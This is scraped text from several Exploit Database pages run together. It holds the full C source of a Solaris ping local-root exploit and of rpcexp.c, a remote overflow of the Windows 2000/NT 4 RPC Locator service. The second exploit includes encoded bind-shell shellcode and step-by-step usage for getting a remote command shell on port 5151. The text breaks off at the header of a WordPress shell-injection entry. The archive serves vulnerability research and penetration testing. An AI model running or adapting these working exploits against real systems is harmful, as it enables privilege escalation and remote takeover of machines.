Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/************************************************************ hoagie_solarisldap.c** gcc hoagie_solarisldap.c -o hoagie_solarisldap** Author: Andi <andi@void.at>** Greetz to Greuff, philipp and the other hoagie-fellas :-)** THIS FILE IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-* CONCEPT. THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY* DAMAGE DONE USING THIS PROGRAM.*** Offsets: 9208 ... without patch 108994-11*************************************************************/#include <stdio.h>#define NOP 0x90#define ORIGSIZE 258char shellcode[]=/* main: */"\xeb\x0a" /* jmp initcall *//* initlcall: */"\x9a\x01\x02\x03\x5c\x07\x04" /* lcall */"\xc3" /* ret *//* jmpz: */"\xeb\x05" /* jmp setuidcode *//* initcall: */"\xe8\xf9\xff\xff\xff" /* call jmpz *//* setuidcode: */"\x5e" /* popl %esi */"\x29\xc0" /* subl %eax, %eax */"\x88\x46\xf7" /* movb %al, 0xfffffff7(%esi) */"\x89\x46\xf2" /* movl %eax, 0xfffffff2(%esi) *//* seteuid(0); */"\x50" /* pushl %eax */"\xb0\x8d" /* movb $0x8d, %al */"\xe8\xe0\xff\xff\xff" /* call initlcall *//* setuid(0); */"\x29\xc0" /* subl %eax, %eax */"\x50" /* pushl %eax */"\xb0\x17" /* movb $0x17, %al */"\xe8\xd6\xff\xff\xff" /* call initlcall */"\xeb\x1f" /* jmp callz *//* start: *//* execve /bin/sh */"\x5e" /* popl %esi */"\x8d\x1e" /* leal (%esi), %ebx */"\x89\x5e\x0b" /* movl %ebx, 0x0b(%esi) */"\x29\xc0" /* subl %eax, %eax */"\x88\x46\x19" /* movb %al, 0x19(%esi) */"\x89\x46\x14" /* movl %eax, 0x14(%esi) */"\x89\x46\x0f" /* movl %eax, 0x0f(%esi) */"\x89\x46\x07" /* movl %eax, 0x07(%esi) */"\xb0\x3b" /* movb $0x3b, %al */"\x8d\x4e\x0b" /* leal 0x0b(%esi), %ecx */"\x51" /* pushl %ecx */"\x51" /* pushl %ecx */"\x53" /* pushl %ebx */"\x50" /* pushl %eax */"\xeb\x18" /* jmp lcall *//* callz: */"\xe8\xdc\xff\xff\xff" /* call start */"\x2f\x62\x69\x6e\x2f\x73\x68" /* /bin/sh */"\x01\x01\x01\x01\x02\x02\x02\x02\x03\x03\x03\x03"/* lcall: */"\x9a\x04\x04\x04\x04\x07\x04"; /* lcall */unsigned long getsp(void){__asm__(" movl %esp,%eax ");}int main(int argc, char **argv) {char buf[512];int offset = 9208;int retaddr = 0;int i;if (argc > 1) {sscanf(argv[1], "%d", &offset);}printf("hoagie_solarisldap local root exploit\n");printf("[*] offset: 0x%x\n", offset);memset(buf, NOP, sizeof(buf));buf[28] = 0xeb;buf[29] = 30;for (i = 0; i < strlen(shellcode); i++) {buf[i + 60] = shellcode[i];}retaddr = getsp() - offset;printf("[*] return address: 0x%x\n", retaddr);for (i = 0; i < 4 * 25; i += 4){buf[i + ORIGSIZE + 2] = retaddr & 0xff;buf[i + ORIGSIZE + 3] = (retaddr >> 8 ) &0xff;buf[i + ORIGSIZE + 0] = (retaddr >> 16 ) &0xff;buf[i + ORIGSIZE + 1] = (retaddr >> 24 ) &0xff;}execl("/usr/sbin/ping", "ping", buf, NULL);}// milw0rm.com [2003-04-01]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 5
Microsoft Windows 2000/NT 4 - RPC Locator Service Remote Overflow - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft Windows 2000/NT 4 - RPC Locator Service Remote OverflowEDB-ID:5CVE:2003-0003EDB Verified:Author:Marcin WolakType:remoteExploit:/Platform:WindowsDate:2003-04-03Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/****************************************************************************rpcexp.cRPC LOCATOR ExploitAutor: Marcin Wolakmail: mwolak11@wp.plLast update: 30 march 2003****************************************************************************//*****************************************************************************About Compilation:What You need to compile rpcexp.c ?1. MS Platform SDK (August SDK is sufficient).2. Compilator (f.e. MS Visual C++ 6.0).rpcns4.lib is needed for linking.*****************************************************************************//*****************************************************************************Usage (You want to exploit remote Windows 2000 system (w2khost) with running RPCLocator Service):1. Set registry values in Your workstation as below:HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Rpc\NameService\NetworkAddress = w2khostHKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Rpc\NameService\ServerNetworkAddress = w2khost2. Establish null session:net use \\w2khost\ipc$ ""/u: ""3. Run Exploit:rpcexp.exe /os w2ksp3If everything it's ok, rpcexp hangs in console window. You can go to secondcmd console, run telnet (on port 5151) and get cmd on w2khost - just runon second console:telnet w2khost 5151WARNNING !With this shellcode You can get remote cmd only once. Second attempt willbe rejected.WARNNING !!Currently only Windows 2000 Sp3 and Windows NT 4 Sp6a are exploitable withrpcexp.*****************************************************************************/#define UNICODE#define RPC_UNICODE_SUPPORTED#define NT4SP6ABRD 0x42#define W2KSP3BRD 0x142#define NT4SP6AJMP 0x0147FBC4#define W2KSP3JMP 0x0090F8F0#define NT4SP6ALLA 0x77F137BD#define NT4SP6AGPA 0x77F13FB3#include <stdio.h>#include <rpc.h>#include <rpcnsi.h>#define PURPOSE \"RPC Locator exploit utility \n\Autor: Marcin Wolak - march 2003 \n\mail: mwolak@gazeta.pl \n\n\Tested on:\n\n\Windows 2000 SP3 \n\Windows NT 4.0 SP6a \n\n\Only for educational purposes !!!.\n\n\Usage:\n\rpcexp.exe /v  - to view rpcexp info.\n\rpcexp.exe /os w2ksp3 - to exploit Windows 2000 Sp3.\n\rpcexp.exe /os ntsp6a - to exploit Windows NT 4 Sp6a.\n"char shellcode [] ="\xEB\x13\x5F\xB9\xCF\x02\xCF\x02\xC1\xE9\x10\x57\x80\x37\x99\x47\xE2\xFA\x5F\xEB""\x05\xE8\xE8\xFF\xFF\xFF\x14\x2E\x42\x98\x99\x99\x14\x06\x59\x9B\x99\x99\xCF\x66""\x8A\xCE\x14\x06\x5D\x9B\x99\x99\x14\x26\x54\x9B\x99\x99\x10\x5B\x65\xA8\x50\x28""\x94\xD0\xA9\x59\x35\x1D\x59\xEC\x60\xCA\xCB\xC8\xCF\xCB\x66\x8A\x32\xC0\xC3\xC2""\x7B\x75\xC2\xCA\x14\x02\x59\x9B\x99\x99\xA9\x59\x35\x1D\x59\xEC\x60\xCF\x66\x8A""\x10\x5B\xC2\xCA\x14\x02\x5D\x9B\x99\x99\x65\xA8\x50\x28\x9E\xA9\x59\x35\x1D\x59""\xEC\x60\xCA\xCB\xC8\xCF\xCB\x66\x8A\x32\xC0\xC3\xC2\x7B\x75\xA8\x59\x2D\x9D\xC9""\x58\x71\x9D\xC9\x66\xCE\x55\x10\x5B\xC2\xCA\x14\x02\x25\x99\x99\x99\xA8\x50\x18""\x58\xC4\x9B\x99\x99\xC9\x13\x8A\x11\x89\xDA\xD9\x7B\x61\xC1\x14\x02\x15\x99\x99""\x99\xCA\xF1\x99\x99\x99\x99\xC9\xC9\xF1\x99\x99\x99\x99\xF1\x99\x99\x99\x99\x66""\xCE\x21\xC9\xF1\x99\x89\x99\x99\x66\xCE\x41\xC1\x72\x6D\x70\x9E\x9B\x99\x99\xC6""\xCE\x18\x5E\xD5\x99\x99\x99\x10\x67\x18\x5F\x16\x66\x66\x66\xC2\x18\x5A\x39\x99""\x99\x99\xCA\xF1\x9B\x9B\x99\x99\x66\xCE\x7D\xA8\x59\xC9\xD9\xC9\xD9\xC9\x66\xCE""\x71\x0A\xF1\x89\x99\x99\x99\xCF\xCA\x66\xCE\x75\xF1\x9B\x99\x99\x99\xCA\x66\xCE""\x69\xA8\x59\xCE\xC9\x29\x95\x32\xC1\x32\xD9\x32\xC6\xD1\xC9\xCE\xCF\x34\xCF\x66""\xCE\x25\xD1\xC9\xCE\x34\xCF\x34\xCF\x66\xCE\x25\xD1\x29\xDD\x10\x9E\xCE\x66\xCE""\x59\xA8\x59\x12\xDF\x6D\x10\xDE\xA5\x10\xDE\xD9\x12\x9F\x10\xDE\xA1\xA8\x59\xFF""\x21\x98\x98\x10\xDE\xB5\xCE\xCE\xA8\x59\xC9\xC9\xC9\xD9\xC9\xD1\xC9\xC9\x34\xCF""\xA8\x59\xC9\x66\xCE\x5D\x66\xEF\x69\x66\xCE\x79\x66\xEF\x65\x66\xCE\x79\xD1\xC9""\xC9\xCA\x66\xCE\x6D\x10\x5A\xA8\x59\x2D\x9D\xC9\x58\x71\x9D\xC9\x66\xCE\x55\x10""\x5F\xA8\x59\x10\x58\x2C\x9D\xC9\xC9\xCE\xC8\xCF\x66\xEE\x0A\x66\xCE\x51\x18\xA6""\x98\x99\x99\x99\xE5\xBC\xA8\x59\xC9\xCE\x66\xAE\xCF\x66\xEE\x0A\x66\xCE\x4D\x90""\x59\xED\x8D\xA8\x59\xC9\x66\xAE\xCF\xCA\x66\xCE\x61\xF1\xC9\x99\x99\x99\x66\xCE""\x41\x72\x5B\xA8\x59\xC9\x2D\x9D\xC9\xCF\xCA\x66\xCE\x65\xCE\xA8\x50\xC8\xC9\xCF""\x66\xEE\x0E\x66\xCE\x49\xF1\xC9\x99\x99\x99\x66\xCE\x41\x72\x38\xC9\x66\xCE\x45""\x09\xD2\xDC\xCB\xD7\xDC\xD5\xAA\xAB\x99\xDC\xE1\xF0\xED\xCD\xF1\xEB\xFC\xF8\xFD""\x99\xDA\xEB\xFC\xF8\xED\xFC\xCD\xF1\xEB\xFC\xF8\xFD\x99\xDA\xEB\xFC\xF8\xED\xFC""\xC9\xF0\xE9\xFC\x99\xDE\xFC\xED\xCA\xED\xF8\xEB\xED\xEC\xE9\xD0\xF7\xFF\xF6\xD8""\x99\xDA\xEB\xFC\xF8\xED\xFC\xC9\xEB\xF6\xFA\xFC\xEA\xEA\xD8\x99\xC9\xFC\xFC\xF2""\xD7\xF8\xF4\xFC\xFD\xC9\xF0\xE9\xFC\x99\xDE\xF5\xF6\xFB\xF8\xF5\xD8\xF5\xF5\xF6""\xFA\x99\xCE\xEB\xF0\xED\xFC\xDF\xF0\xF5\xFC\x99\xCB\xFC\xF8\xFD\xDF\xF0\xF5\xFC""\x99\xCA\xF5\xFC\xFC\xE9\x99\xDC\xE1\xF0\xED\xC9\xEB\xF6\xFA\xFC\xEA\xEA\x99\xDA""\xF5\xF6\xEA\xFC\xD1\xF8\xF7\xFD\xF5\xFC\x99\xCE\xCA\xD6\xDA\xD2\xAA\xAB\x99\xCE""\xCA\xD8\xCA\xED\xF8\xEB\xED\xEC\xE9\x99\xEA\xF6\xFA\xF2\xFC\xED\x99\xFB\xF0\xF7""\xFD\x99\xF5\xF0\xEA\xED\xFC\xF7\x99\xF8\xFA\xFA\xFC\xE9\xED\x99\xEA\xFC\xF7\xFD""\x99\xEB\xFC\xFA\xEF\x99\x9B\x99\x8D\x86\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99""\x99\x99\xFA\xF4\xFD\xB7\xFC\xE1\xFC\x99\xFD\x06\x71\xEE\x81\x02\x71\xEE\x71\x6D""\x64\x66\x66\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99";void Usage(char * pszProgramName){fprintf(stderr, "%s", PURPOSE);exit(1);}void _CRTAPI1 main(int argc, char **argv){unsigned short mytab[2000];				// Exploit Bufferunsigned char * TmpEntryName  = NULL;		// Temporary Entry.unsigned long * EntryName  = NULL;unsigned long * TmpPtr  = NULL;unsigned short * pszStrBinding = NULL;RPC_NS_HANDLE hnsHandle;unsigned long NsSntxType = RPC_C_NS_SYNTAX_DEFAULT;RPC_STATUS status;short fSuccess = 0;short fContinue = 1;unsigned long i,k;unsigned long * PtrLLA = (unsigned long*) &shellcode[730];unsigned long * PtrGPA = (unsigned long*) &shellcode[734];unsigned long JMP = W2KSP3JMP;unsigned long BORDER = W2KSP3BRD;switch(argc){case 2:if((strlen(argv[1]) == 2) && (!strcmp(argv[1],"/v")))Usage(argv[0]);elseprintf("Bad arguments !!!\n");exit(2);case 3:if((strlen(argv[1]) == 3) && (strlen(argv[2]) == 6) &&(!strcmp(argv[1],"/os")) && (!strcmp(argv[2],"w2ksp3")))break;if((strlen(argv[1]) == 3) && (strlen(argv[2]) == 6) &&(!strcmp(argv[1],"/os")) && (!strcmp(argv[2],"ntsp6a"))){(*PtrLLA) = NT4SP6ALLA ^ 0x99999999;(*PtrGPA) = NT4SP6AGPA ^ 0x99999999;JMP = NT4SP6AJMP;BORDER = NT4SP6ABRD;break;}default:Usage(argv[0]);}EntryName = (unsigned long *) mytab;TmpEntryName = (unsigned char *) mytab;TmpEntryName[0] = '/';TmpEntryName[1] = 0;TmpEntryName[2] = '.';TmpEntryName[3] = 0;TmpEntryName[4] = ':';TmpEntryName[5] = 0;TmpEntryName[6] = '/';TmpEntryName[7] = 0;for (i=2;i<768;i++){if(i <= BORDER)EntryName[i] = JMP;if(i == BORDER){TmpPtr = (unsigned long*) shellcode;for(k = 0;k < 190;k++)EntryName[i+k] = TmpPtr[k];i += 189;}if(i > BORDER)EntryName[i] = JMP;}EntryName[768] = 0;RpcTryExcept {status = RpcNsBindingLookupBegin(NsSntxType,(unsigned short *) EntryName,0,NULL,0,&hnsHandle);printf("RpcNsBindingLookupBegin returned 0x%x\n", status);}RpcExcept(1){printf("RPC Runtime raised exception 0x%x\n", RpcExceptionCode());}RpcEndExcept} /*End of Main*/// milw0rm.com [2003-04-03]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 6
WordPress 2.0.2 - 'cache' Remote Shell Injection - PHP webapps Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDWordPress 2.0.2 - 